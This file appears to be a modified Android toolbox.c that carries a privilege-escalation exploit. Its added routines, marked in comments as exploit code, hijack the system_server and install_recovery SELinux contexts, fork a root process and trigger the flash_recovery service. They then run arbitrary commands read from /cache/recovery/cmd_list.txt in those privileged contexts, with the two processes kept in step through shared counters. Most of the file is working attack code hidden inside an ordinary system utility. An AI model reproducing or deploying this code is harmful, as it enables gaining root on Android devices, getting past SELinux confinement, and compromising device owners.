#include <sys/wait.h>
#include <sys/types.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <cutils/properties.h>
#include <selinux/selinux.h>
#include <errno.h>

#include "shared.h"

typedef char *security_context_t;

int system_server_loop();
void eXecCmd(char *, security_context_t);
void  parse(char *, char **);
void exitreason(pid_t, int);
void  execute(char **argv);

//toolbox function definitions
int main(int, char **);

static int toolbox_main(int argc, char **argv)
{
    // "toolbox foo ..." is equivalent to "foo ..."
    if (argc > 1) {
        return main(argc - 1, argv + 1);
    } else {
        printf("!Toolbox!\n");
        return 0;
    }
}

#define TOOL(name) int name##_main(int, char**);
#include "tools.h"
#undef TOOL

static struct 
{
    const char *name;
    int (*func)(int, char**);
} tools[] = {
    { "toolbox", toolbox_main },
#define TOOL(name) { #name, name##_main },
#include "tools.h"
#undef TOOL
    { 0, 0 },
};

static void SIGPIPE_handler(int signal) {
    // Those desktop Linux tools that catch SIGPIPE seem to agree that it's
    // a successful way to exit, not a failure. (Which makes sense --- we were
    // told to stop by a reader, rather than failing to continue ourselves.)
    _exit(0);
}

int main(int argc, char **argv)
{
	//default toolbox variables
    int i;
    char *name = argv[0];


	//saves current context
	security_context_t currcon;
	//we use this to fork < system_server into it's own loop    
    pid_t ss_cpid, ss_check_this_pid;


	security_context_t SERVER_CONTEXT = "u:r:system_server:s0";
	security_context_t INSTALL_CONTEXT = "u:r:install_recovery:s0";

	getcon(&currcon);
	LOGV("[+] toolbox running %s as uid: %d, gid: %d, context %s", argv[0], getuid(), getgid(), currcon);

														/* we will capture a root + system_server process, then fork it */
								if( !strcmp(SERVER_CONTEXT, currcon) && increment_value(0, RSF_TOOLBOX_RUN_ONCE) ) { /* I expect current value of 0, otherwise return false */
																			
																			/* if system_server context && increment did't return 0 we will be here */
														
											//LOGV("[*] Forking system_server < install_recovery + system_server pid:%i",getpid());
    										ss_cpid = fork();
    										switch (ss_cpid) 
    										{
        										case -1: //LOGV("Fork failed; ss_cpid == -1");
                 									break;
        										case 0: ss_check_this_pid = getpid();
        										
        											//send the spawned root+system_server thread into the system_server_loop() function
        											if(system_server_loop()){		}else{	exit(0);  }

       											//original thread will pass by to become install_recovery
		        							}        			

								
								//LOGV("[*] toolbox property_set flash_recovery pid:%i",getpid());
								property_set("ctl.start", "flash_recovery");
								
								/* ONLY the first install_recovery will be hijacked, use the same file as system_server but this time set it to 2 */
								/* if current context == install_recovery AND we haven't already increment RSF_TOOLBOX_RUN_ONCE to be value of 2 */
								}else if (!strcmp(INSTALL_CONTEXT, currcon) && increment_value(1, RSF_TOOLBOX_RUN_ONCE) ) {	/* increment rejects if value not currently 1 */							
																			/* if install_recovery context && increment did't return 0 we will be here */
																//LOGV("[*] -=-= EXPLOIT ACTIVE =-=- ");




		// when bridge has sen't cmd_list.txt and any supporting files for our cmd_list.txt this value will be 1 inside the file
		while(check_value(RSF_SENT_FILE_LIST) != 1) {usleep(200);}


	   char *    exec_trimmed_CmdLine; //This is the command line |/system/bin/<binary> <options> <args>|
	   char *	 tmpStr; //used to test requested context. -$ system_server or -# install_recovery
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;
		int ret=1;

			//open the file hardcoded below <DEBUG> hard coded
   			FILE *file_ir_cmds = fopen("/cache/recovery/cmd_list.txt","r");
   				if (file_ir_cmds == NULL) {
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), file_ir_cmds)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");

			ret = strncmp(tmpStr, "-#", 2);
			if ( ret == 0 ){
				//this is the desired context, execute this line
				eXecCmd(exec_trimmed_CmdLine,INSTALL_CONTEXT);
			}

					//signal system_server to continue
					if ( increment_value(0, RSF_IREC_DONE) ) {} /* please notice that i used increment_value here
																   instead of the set_value function */
					
						//wait for system_server to set the value 0 again
						while ( check_value(RSF_IREC_DONE) != 0 ) {
						usleep(200);} /* add delay so as not to cook the cpus */
		iCntr++;
		}
					//signal system_server to continue
					if ( increment_value(0, RSF_IREC_DONE) ) {} /* careful, i used increment_value here not set_value */

	if(file_ir_cmds != NULL)				        
	fclose(file_ir_cmds);


		//signal bridge/till/farm that we are done now.	   
if ( increment_value(1, RSF_SENT_FILE_LIST) ) {}


} //END OF ELSE IF --- PRIV ELEVATION LOGIC


leave_hack:
if(currcon != NULL)
	free(currcon);    
    
    
    // Let's assume that none of this code handles broken pipes. At least ls,
    // ps, and top were broken (though I'd previously added this fix locally
    // to top). We exit rather than use SIG_IGN because tools like top will
    // just keep on writing to nowhere forever if we don't stop them.
    signal(SIGPIPE, SIGPIPE_handler);

    if((argc > 1) && (argv[1][0] == '@')) {
        name = argv[1] + 1;
        argc--;
        argv++;
    } else {
        char *cmd = strrchr(argv[0], '/');
        if (cmd)
            name = cmd + 1;
    }

    for(i = 0; tools[i].name; i++){
        if(!strcmp(tools[i].name, name)){
            return tools[i].func(argc, argv);
        }
    }

    printf("%s: no such tool\n", argv[0]);
    return -1;
}

//folowing code is 100% exploit code, not part of toolbox.c
int system_server_loop(){
						/* wait for install_recovery to process a line 
						   then system_server will process a line, 
						   then install_recovery again and so on */
							while ( check_value(RSF_IREC_DONE) != 1 ) {
							usleep(200);} /* add delay so as not to cook the cpus */

	security_context_t SERVER_CONTEXT = "u:r:system_server:s0";
	
	   char *    exec_trimmed_CmdLine; //command line trimmed and ready to execute
	   char *	 tmpStr; //used to test the desired context; system_server vs install_recovery
	   
	   //while loop processes cmd_list.txt
		char line[2040];
		int iCntr=0;
		int ret=1; //true is false basically.. 

			//open the file
   			FILE *fpBlock = fopen("/cache/recovery/cmd_list.txt","r");
   				if (fpBlock == NULL) {
   					LOGV("error opening cmd_list.txt in system_server loop");
   					return 1;
   				}

//===>[-] Parse text file for bridge specific duties [-]<===
		while (fgets(line, sizeof(line), fpBlock)) {
			tmpStr = strtok(line,"|");
			exec_trimmed_CmdLine = strtok(NULL,"|");
			
			//test if applies to system_server
			int ret = strncmp(tmpStr, "-$", 2);
			if ( ret == 0 ){
				//this is the desired context, execute this line
				eXecCmd(exec_trimmed_CmdLine,SERVER_CONTEXT);
			}


					//signal install_recovery to continue
					if ( set_value(0, RSF_IREC_DONE) ) {}
					
					
						//wait for install_recovery to set the value 1 again
						while ( check_value(RSF_IREC_DONE) != 1 ) {
						usleep(200);} /* add delay so as not to cook the cpus */

			iCntr++;
	
		}
					//signal install_recovery to continue, must use set_value here not increment_value
					if ( set_value(0, RSF_IREC_DONE) ) {}
		

	if(fpBlock != NULL)				        
	fclose(fpBlock);
		
		
		
	return 0;
}
void eXecCmd(char *command_line, security_context_t context) {
    //security_context_t context="u:r:init:s0";
	//attempt to set context for the exec call
   	int isetcon = setexeccon(context);
   	if ( isetcon < 0 ) {LOGV("[-] Toolbox: error setcon");}
				
     char  *argv[64];              			/* the command line argument      	*/
          parse(command_line, argv);		/*   parse the line               	*/
          execute(argv);        	/*   execute the command 			*/

}
//parse into a command line
void  parse(char *line, char **argv)
{
     while (*line != '\0') {       /* if not the end of line ....... */ 
          while (*line == ' ' || *line == '\t' || *line == '\n')
               *line++ = '\0';     /* replace white spaces with 0    */
          *argv++ = line;          /* save the argument position     */
          while (*line != '\0' && *line != ' ' && 
                 *line != '\t' && *line != '\n') 
               line++;             /* skip the argument until ...    */
     }
     *argv = '\0';                 /* mark the end of argument list  */
}
//execute a command
void  execute(char **argv)
{
		extern char **environ;
		
    	pid_t childprocess;
    	int status=0;
    	int waitoptions = 0;
    	//WNOHANG    return immediately if no child has exited.
    	//WUNTRACED  also return if a child has stopped (but not traced via ptrace(2)).  Status for traced children which have stopped is provided even if this option is not specified.
    	//WCONTINUED also return if a stopped child has been resumed by delivery of SIGCONT.
    	int res=-1;

    		if( (childprocess = fork()) == 0 ) 													/* Child proc block */
    		{
    	    	if( (res = execve(*argv, argv, environ)) < 0 ) 									/* -=-=->] Execute [<-=-=- */
    	    	{	
    	    		LOGV("[-] Toolbox %s %s [failure: %s]", argv[0], argv[1], strerror(errno));	/* Report errors */
					exitreason(childprocess, status); 											/* test for signals or coredump */
    	    		exit(91); 																	/* must exit child */
    	    	}
    		}
    		else if( childprocess > 0 )
    		{
    	    	waitpid(childprocess, &status, waitoptions);								/* parent, waitfor child */
   	    		if ( !status ){LOGV("[+] Toolbox success: %s %s", argv[0], argv[1]);}		/* if status is 0 we had success */
    		} else {LOGV("[-] Toolbox failed to fork process");}

}
//some testing for when there was an error.
void exitreason(pid_t childprocess, int status)
{
    if( WIFSIGNALED(status) )
    {
        LOGV("[-] Toolbox child %d process was terminated by a signal.",childprocess);
        if( WTERMSIG(status) )
        {
        	LOGV("[-] Toolbox child %d signal %d that caused the child process to terminate.",childprocess,WTERMSIG(status));
        }
        if( WCOREDUMP(status) )
        {
        	LOGV("[-] Toolbox child %d produced a core dump",childprocess);
        }
    }
    if( WIFSTOPPED(status) )
    {
        LOGV("[-] Toolbox child %d process was stopped by delivery of a signal (see ptrace(2)).",childprocess);
        if( WSTOPSIG(status) )
        {
        	LOGV("[-] Toolbox child %d number of the signal which caused the child to stop.",childprocess);
        }
    }
}
//WIFEXITED(status) returns true if the child terminated normally, that is, by calling exit(3) or _exit(2), or by returning from main().
//WEXITSTATUS(status) returns the exit status of the child.  This consists of the least significant 8 bits of the status argument that the child specified in a call to exit(3) or _exit(2) or as the argument for a return statement in main().  This macro should only be employed if WIFEXITED returned true.
//WIFSIGNALED(status) returns true if the child process was terminated by a signal.
//WTERMSIG(status) returns the number of the signal that caused the child process to terminate.  This macro should only be employed if WIFSIGNALED returned true.
//WCOREDUMP(status) returns true if the child produced a core dump.  This macro should only be employed if WIFSIGNALED returned true.  This macro is not specified in POSIX.1-2001 and is not available on some UNIX implementations (e.g., AIX, SunOS).  Only use this enclosed in #ifdef WCOREDUMP ... #endif.
//WIFSTOPPED(status) returns true if the child process was stopped by delivery of a signal; this is only possible if the call was done using WUNTRACED or when the child is being traced (see ptrace(2)).
//WSTOPSIG(status) returns the number of the signal which caused the child to stop.  This macro should only be employed if WIFSTOPPED returned true.
//WIFCONTINUED(status) (since Linux 2.6.10) returns true if the child process was resumed by delivery of SIGCONT.
